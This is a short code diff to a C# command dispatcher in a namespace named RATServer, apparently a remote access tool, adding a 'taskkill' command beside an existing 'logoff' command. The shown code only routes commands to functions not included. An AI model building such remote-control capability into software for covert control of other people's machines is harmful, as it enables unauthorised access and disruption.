@@ -106,6 +106,9 @@ namespace RATServer
                         case "logoff":
                             r = Functions.LogOff();
                             break;
+                        case "taskkill":
+                            r = Functions.TaskKill(c.Args[0]);
+                            break;
                         default:
                             break;
                     }                 
